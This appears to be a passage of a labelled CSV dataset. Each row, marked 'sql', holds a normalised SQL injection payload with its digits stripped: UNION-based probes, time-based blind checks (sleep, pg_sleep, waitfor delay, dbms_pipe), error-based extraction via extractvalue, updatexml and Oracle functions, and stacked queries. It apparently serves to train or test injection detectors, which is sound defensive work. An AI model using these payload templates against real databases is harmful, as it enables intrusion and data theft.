,language,source
3484,sql,". . / / ? = & = & = % ' ) union all select null , null , null , null , null , null , null , null , null # "
3485,sql,". . . . ? = % "" and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and " % " = " "
3486,sql,". . . / / / ? = & = & = - ' union all select , , , , , , , , , -- "
3487,sql,". . / / / ? = & = % "" and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and " % " = " "
3488,sql,". . ? = & = & = & = % ' and = # "
3489,sql,". . . / / / ? = & = & = & = "" ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( " wwez " = " "
3490,sql,". . . / ? = & = & = & = ) ) ) and = % "
3491,sql,". . . ? = ) union all select null , null , null , null , null -- "
3492,sql,". . / ? = & = & = ' and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) -- "
3493,sql,". . / / / ? = ' ) ) ) and = and ( ( ( ' zdqa ' = ' "
3494,sql,". . . . / / / ? = - ) union all select , , , , , , , , -- "
3495,sql,". . . . / / / ? = & = & = - ' union all select , , , , , , , -- "
3496,sql,". . . / / / / ? = & = ' union all select null , null , null , null , null , null # "
3497,sql,". . . . / / / ? = & = ) ) ) union all select null , null , null , null , null -- "
3498,sql,". . . . / / / / ? = & = "" and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and " aqoo " like " "
3499,sql,". . . / / ? = & = % "" and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and " % " = " "
3500,sql,". . . ? = & = & = & = and elt ( = , sleep ( ) ) "
3501,sql,". . / / ? = & = ' union all select null , null , null , null , null , null , null , null -- "
3502,sql,". . . . / / / ? = & = & = % ' ) ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( ' % ' = ' "
3503,sql,". . ? = "" ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( " vzyz " = " "
3504,sql,". . . / / ? = ' ) and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ( ' esor ' like ' "
3505,sql,". . . . / / ? = & = & = & = % ' ) ) and make_set ( = , ) and ( ( ' % ' = ' "
3506,sql,". . . . / / / / ? = & = ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
3507,sql,". . / / / ? = & = % ' ) union all select null -- "
3508,sql,". . / / / ? = & = & = & = % ' ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ( ' % ' = ' "
3509,sql,". . . . / / / / ? = & = - ' union all select , , , , , # "
3510,sql,". . . / ? = & = & = & = ) ) union all select null # "
3511,sql,". . . / / ? = & = % "" and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and " % " = " "
3512,sql,". . / / / / ? = & = & = ' ) ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ( ( ' zcrm ' = ' "
3513,sql,". . . . / / / / ? = "" ) ) order by -- "
3514,sql,". . . / / ? = & = & = - ' ) ) union all select , , , , , , # "
3515,sql,". . . / / ? = & = & = ( case when ( = ) then else * ( select from dual union select from dual ) end ) "
3516,sql,". . . / / / ? = & = & = "" ) ; select ( case when ( = ) then else / ( select ) end ) --"
3517,sql,". . . ? = & = & = and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) # "
3518,sql,". . / ? = ' ) ) and ( select * from ( select ( sleep ( ) ) ) zhty ) and ( ( ' crvc ' = ' "
3519,sql,". . / / / ? = & = "" ) ) union all select null , null # "
3520,sql,". . . / / / / ? = - order by # "
3521,sql,". . . . ? = ' ) ) union all select null , null , null , null , null -- "
3522,sql,". . . / ? = & = & = & = ' ) and = ( select from pg_sleep ( ) ) and ( ' yvxe ' = ' "
3523,sql,". . / ? = & = & = & = ' and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ' rplo ' like ' "
3524,sql,". . . . / / / / ? = ' ) ; select sleep ( ) and ( ' egdw ' like ' "
3525,sql,". . . / ? = & = ' ) ) and sleep ( ) and ( ( ' cgdy ' = ' "
3526,sql,". . . . / ? = & = ) ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( ( = "
3527,sql,". . . . ? = & = % ' and = -- "
3528,sql,". . . . / / / / ? = & = & = & = - % ' ) union all select , , , , , , , , -- "
3529,sql,". . / / ? = & = & = ' ) ) order by -- "
3530,sql,". . . . / / / / ? = & = & = % ' ) union all select null , null , null , null , null , null , null , null , null , null # "
3531,sql,". . . / / / ? = % ' ) ) and = and ( ( ' % ' = ' "
3532,sql,". . / ? = ' ) ) ) ; select sleep ( ) and ( ( ( ' xtly ' = ' "
3533,sql,". . . / / ? = & = ( select ( case when ( = ) then dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) else end ) from dual ) "
3534,sql,". . . / / / ? = - ' union all select , , , -- "
3535,sql,". . ? = "" ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( " buyi " like " "
3536,sql,". . . / / ? = & = & = & = % ' union all select null -- "
3537,sql,". . . . / / / ? = & = - "" ) union all select , , , , , , -- "
3538,sql,". . . . ? = & = ) ; if ( = ) select else drop function rpwm --"
3539,sql,". . / ? = & = ' ) ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( ( ' geiw ' = ' "
3540,sql,". . . . ? = & = & = & = ' and = and ' culc ' like ' "
3541,sql,". . . / / / / ? = & = - ' order by -- "
3542,sql,". . . / / / ? = & = & = union all select null , null , null , null , null , null , null , null , null # "
3543,sql,". . . . ? = "" and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and " kckz " like " "
3544,sql,". . . / / ? = & = union all select null , null , null , null # "
3545,sql,". . / ? = & = - "" ) union all select , , , , , , , , , -- "
3546,sql,". . ? = - "" ) union all select , , , , , , -- "
3547,sql,". . / ? = & = & = ) ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( ( = "
3548,sql,". . . / / / ? = & = % ' ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( ' % ' = ' "
3549,sql,". . . . ? = & = & = & = ' ) ) and make_set ( = , ) and ( ( ' meik ' = ' "
3550,sql,". . . / ? = & = ' ) union all select null , null , null , null , null , null , null , null , null , null # "
3551,sql,". . / / / / ? = iif ( = , , / ) "
3552,sql,". . . / / ? = & = & = & = "" ) ) union all select null , null , null , null -- "
3553,sql,". . . / / / ? = & = & = ' ) ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) # "
3554,sql,". . . / / / / ? = and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) "
3555,sql,". . . / ? = ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( = "
3556,sql,". . . ? = ' ) ) ) ; ( select * from ( select ( sleep ( ) ) ) cxfv ) # "
3557,sql,". . / / / ? = & = ' ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
3558,sql,". . ? = & = & = & = ( select concat ( x , ( select ( elt ( = , ) ) ) , xba ) ) "
3559,sql,". . . . / / / ? = & = ' ; select ( case when ( = ) then else / ( select ) end ) --"
3560,sql,". . . ? = & = & = & = "" ) and ( select * from ( select ( sleep ( ) ) ) uygz ) and ( " yshb " = " "
3561,sql,". . . / / ? = ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( = "
3562,sql,". . ? = & = & = - union all select # "
3563,sql,". . . ? = & = & = ' ) ) ) and sleep ( ) and ( ( ( ' rnos ' = ' "
3564,sql,". . . / / ? = - ' union all select , , , , -- "
3565,sql,". . ? = & = ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( = "
3566,sql,". . / ? = & = union all select null , null , null , null -- "
3567,sql,". . . / / ? = ) ) union all select null , null , null , null , null , null , null -- "
3568,sql,". . / / ? = & = & = & = - ' union all select , , , , -- "
3569,sql,". . . / / ? = & = & = ' union all select null # "
3570,sql,". . / ? = & = & = & = - ' ) union all select , , , , -- "
3571,sql,". . / / / ? = & = & = & = ) ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( ( = "
3572,sql,". . . . / ? = & = % ' and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ' % ' = ' "
3573,sql,". . ? = & = and sleep ( ) "
3574,sql,". . / ? = & = & = - % "" union all select , , , , , , , , , # "
3575,sql,". . / ? = & = % ' ) ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3576,sql,". . . . / / / ? = ' ) and sleep ( ) and ( ' rlaj ' = ' "
3577,sql,". . . . / / / / ? = & = ) ) and = % "
3578,sql,". . . . ? = & = - ' ) union all select , , , , # "
3579,sql,". . . . / / / / ? = & = & = ) ) ; select pg_sleep ( ) --"
3580,sql,". . / / ? = & = ' ) ) and = -- "
3581,sql,". . / ? = & = & = and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) -- "
3582,sql,". . ? = & = procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) "
3583,sql,". . . / / / / ? = & = "" ; select pg_sleep ( ) --"
3584,sql,". . . ? = & = & = ' , ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) -- "
3585,sql,". . . / / / / ? = & = - ' ) ) order by -- "
3586,sql,". . . . / / ? = & = & = ' order by # "
3587,sql,". . . / / / ? = "" ) and = -- "
3588,sql,". . / / / / ? = & = & = "" ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( " cgme " like " "
3589,sql,". . . . / / / ? = & = & = & = "" union all select null , null , null , null , null # "
3590,sql,". . / ? = & = & = & = "" ) ) and ( select * from ( select ( sleep ( ) ) ) zhty ) and ( ( " dnsq " = " "
3591,sql,". . / / / ? = & = & = & = - % ' union all select , , , # "
3592,sql,". . . / / ? = & = - "" union all select , , , , , , , -- "
3593,sql,". . / / ? = & = - ) ) union all select , , , , , , , , # "
3594,sql,". . . . / / / ? = ' and = -- "
3595,sql,". . . . / / / / ? = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' vdmp ' like ' "
3596,sql,". . ? = & = & = & = ' ) union all select null , null , null -- "
3597,sql,". . . / ? = "" and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and " pzqb " = " "
3598,sql,". . . / / ? = ' and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
3599,sql,". . . / / / / ? = % ' ) ) union all select null , null , null # "
3600,sql,". . / ? = & = and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) -- "
3601,sql,". . / / ? = & = & = & = ) ) ) ; select pg_sleep ( ) --"
3602,sql,". . . . / ? = - ' union all select , , , , # "
3603,sql,". . . / / ? = & = ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3604,sql,". . / / ? = & = - "" ) ) union all select , , , -- "
3605,sql,". . . . / / ? = & = & = & = % ' union all select null # "
3606,sql,". . . . / / / / ? = & = % ' union all select null , null , null , null , null # "
3607,sql,". . / / ? = & = & = ) ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
3608,sql,". . . . / / / / ? = & = & = % ' ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
3609,sql,". . / ? = & = % "" ; select ( case when ( = ) then else / ( select ) end ) --"
3610,sql,". . . . ? = & = & = & = ' and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ' axoi ' like ' "
3611,sql,". . . . / / ? = & = % ' ) and = % "
3612,sql,". . . / / / ? = & = & = & = - "" ) union all select , , , , , , , , , -- "
3613,sql,". . . . / / ? = - ' union all select -- "
3614,sql,". . / ? = & = & = & = ' ) ) ) and make_set ( = , ) and ( ( ( ' akcs ' = ' "
3615,sql,". . . . / / ? = & = & = & = % ' ) and = # "
3616,sql,". . / / ? = "" ) and = -- "
3617,sql,". . . / / ? = & = & = ' ) ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ( ' ghvb ' like ' "
3618,sql,". . . ? = & = & = & = ) and make_set ( = , ) and ( = "
3619,sql,". . / / ? = & = & = & = - "" ) ) union all select , , , , , # "
3620,sql,". . / ? = ' ) ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( ( ' ctax ' = ' "
3621,sql,". . . . / / ? = & = and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) "
3622,sql,". . / / ? = & = & = & = - "" ) ) union all select , , , , , , , , -- "
3623,sql,". . . . ? = & = - ) ) ) order by # "
3624,sql,". . . . / / ? = & = & = & = - % ' union all select , , , , , -- "
3625,sql,". . / / / ? = % "" union all select null , null , null , null , null , null -- "
3626,sql,". . . . / ? = - ' union all select , # "
3627,sql,". . / / / / ? = "" ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( " ozje " = " "
3628,sql,". . . / / / / ? = & = & = "" ) union all select null , null , null # "
3629,sql,". . . . / / / / ? = ) union all select null , null , null , null , null , null , null , null -- "
3630,sql,". . ? = ; ( select * from ( select ( sleep ( ) ) ) bcts ) # "
3631,sql,". . / ? = & = & = "" and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and " udfp " = " "
3632,sql,". . / ? = & = & = & = - "" ) ) union all select -- "
3633,sql,". . / ? = & = - union all select , -- "
3634,sql,". . . . ? = - % "" order by # "
3635,sql,". . . / ? = & = & = ' ) ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
3636,sql,". . . . / / / / ? = - union all select , , , , -- "
3637,sql,". . . . / / ? = & = & = % ' ) ) and = and ( ( ' % ' = ' "
3638,sql,". . ? = % ' ) ) rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ( ( ' % ' = ' "
3639,sql,". . . ? = ' , ( select from ( select row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) ) s ) -- "
3640,sql,". . / / / / ? = & = ) ) ) ; select pg_sleep ( ) --"
3641,sql,". . / / ? = & = ' ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( ' mzdi ' like ' "
3642,sql,". . . . / / / ? = - ' union all select , , # "
3643,sql,". . . / / / ? = ) ) ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( ( = "
3644,sql,". . . / / / ? = & = & = ' ) ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( ( ' mebl ' like ' "
3645,sql,". . / / ? = & = & = & = ' rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ' tmeq ' like ' "
3646,sql,". . . / / ? = ' and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ' nxkq ' = ' "
3647,sql,". . . / / / ? = & = & = ) ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ( = "
3648,sql,". . . . / / / ? = & = rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) "
3649,sql,". . . . ? = ' union all select null , null , null , null , null , null # "
3650,sql,". . . . ? = & = & = & = % ' ) ) ; waitfor delay ' : : ' --"
3651,sql,". . . ? = and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null -- "
3652,sql,". . / / ? = & = ' ) ) rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ( ( ' vzzc ' = ' "
3653,sql,". . / / / / ? = & = "" ) and = and ( " izdj " = " "
3654,sql,". . . . / / / ? = & = ) ) union all select null , null , null # "
3655,sql,". . . . / / ? = & = & = and = -- "
3656,sql,". . . . / / ? = & = & = & = union all select null , null , null , null , null , null , null , null , null # "
3657,sql,". . . / ? = & = & = order by # "
3658,sql,". . ? = & = ) ) ) ; select sleep ( ) # "
3659,sql,". . / ? = & = ' and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ' dzms ' like ' "
3660,sql,". . . . / / / / ? = & = % ' union all select null , null , null , null , null , null , null , null , null , null -- "
3661,sql,". . / / ? = % ' ) ) and = % "
3662,sql,". . / / / / ? = & = & = & = ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) "
3663,sql,". . . . / / / / ? = . "
3664,sql,". . / / / / ? = & = & = & = ' and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ' tayp ' = ' "
3665,sql,". . . / / / / ? = ' ) and = -- "
3666,sql,". . . . / / / / ? = & = & = & = - ' union all select , , # "
3667,sql,". . . . ? = & = & = & = ' and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ' zfxm ' = ' "
3668,sql,". . . . / / / ? = & = & = & = and make_set ( = , ) -- "
3669,sql,". . . . / / / ? = "" ) order by -- "
3670,sql,". . . / ? = & = & = - union all select , , , # "
3671,sql,". . . . / / / ? = & = & = ' and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ' tayp ' = ' "
3672,sql,". . . . / / ? = and sleep ( ) # "
3673,sql,". . . / / / / ? = & = & = - "" order by -- "
3674,sql,". . . . / ? = & = & = & = "" ) union all select null , null , null , null -- "
3675,sql,". . . / / ? = & = & = & = ) rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ( = "
3676,sql,". . / / / ? = ) ) and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ( ( = "
3677,sql,". . . / / / ? = & = & = ' and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ' jijs ' like ' "
3678,sql,". . . ? = & = - ) union all select -- "
3679,sql,". . / / ? = & = & = & = - ) order by -- "
3680,sql,". . / ? = & = & = & = ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( = "
3681,sql,". . / / ? = & = & = % ' ; select ( case when ( = ) then else / ( select ) end ) --"
3682,sql,". . . . / ? = & = & = - ' ) ) union all select , , # "
3683,sql,". . . ? = & = ' ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ' qpyk ' like ' "
3684,sql,". . / / / ? = & = ) ) ) and make_set ( = , ) and ( ( ( = "
3685,sql,". . . . / ? = & = & = & = ) union all select null # "
3686,sql,". . . ? = & = & = & = - % ' union all select , , , , , # "
3687,sql,". . . . ? = & = & = "" ) union all select null # "
3688,sql,". . . / / ? = & = & = & = ' and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ' zjth ' = ' "
3689,sql,". . / / / ? = & = ' ) ) and sleep ( ) and ( ( ' ewzk ' like ' "
3690,sql,". . . . ? = % ' order by -- "
3691,sql,". . / / / ? = & = & = & = ) and = -- "
3692,sql,". . ? = & = - % ' ) union all select , , , , , -- "
3693,sql,". . . . / ? = & = & = - "" ) union all select -- "
3694,sql,". . / / / ? = & = & = & = % ' ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( ' % ' = ' "
3695,sql,". . . / / / ? = & = & = ' and ( select * from ( select ( sleep ( ) ) ) zhty ) and ' hcoq ' like ' "
3696,sql,". . / / / / ? = & = & = ' ) ) ) rlike sleep ( ) and ( ( ( ' ukrt ' = ' "
3697,sql,". . . . / ? = & = & = % ' ) ) union all select null , null , null , null , null , null , null # "
3698,sql,". . . ? = % ' ) ) union all select null # "
3699,sql,". . / / ? = & = & = & = "" ) ; select sleep ( ) and ( " xzdz " = " "
3700,sql,". . . . / / / / ? = & = & = & = % ' ) order by -- "
3701,sql,". . . / ? = & = - ) ) union all select , , -- "
3702,sql,". . ? = order by -- "
3703,sql,". . . / / / / ? = & = & = % "" order by -- "
3704,sql,". . . . / / ? = % ' ) and = and ( ' % ' = ' "
3705,sql,". . . . / / / ? = & = & = & = and = -- "
3706,sql,". . . / / / / ? = - ) ) ) order by -- "
3707,sql,". . . . / ? = & = - ' union all select -- "
3708,sql,". . / / / / ? = & = & = % ' and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ' % ' = ' "
3709,sql,". . ? = & = & = & = ' and ( select * from ( select ( sleep ( ) ) ) zhty ) and ' scip ' = ' "
3710,sql,". . / / ? = and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) # "
3711,sql,". . . . / ? = & = & = & = - ' union all select , , , , , , , , -- "
3712,sql,". . . / / / ? = & = & = & = "" procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and " aqwj " like " "
3713,sql,". . . / / / ? = & = & = "" ) and = % "
3714,sql,". . . / / / ? = & = ' ) ) order by -- "
3715,sql,". . / / / ? = & = ) ) ) union all select null , null , null , null # "
3716,sql,". . . . / / / / ? = & = - union all select , , , , , # "
3717,sql,". . . / ? = & = & = ) ) ) ; select pg_sleep ( ) --"
3718,sql,". . . / ? = & = & = & = - % "" union all select # "
3719,sql,". . / ? = "" ) ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( " izbh " = " "
3720,sql,". . . . / ? = & = & = ' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' szos ' like ' "
3721,sql,". . . . / / / ? = & = & = & = ' rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ' yrre ' = ' "
3722,sql,". . . . / / / / ? = & = & = ) ) ) and = % "
3723,sql,". . . / / / / ? = "" ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( " frrx " = " "
3724,sql,". . . ? = & = % "" and sleep ( ) and " % " = " "
3725,sql,". . . / / / / ? = & = & = "" ) rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ( " phke " = " "
3726,sql,". . . . / / ? = & = & = ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( = "
3727,sql,". . . . ? = & = "" rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and " cupq " like " "
3728,sql,". . . . / / / / ? = & = & = union all select null , null , null , null , null , null , null , null , null -- "
3729,sql,". . / ? = & = & = - "" union all select , , , # "
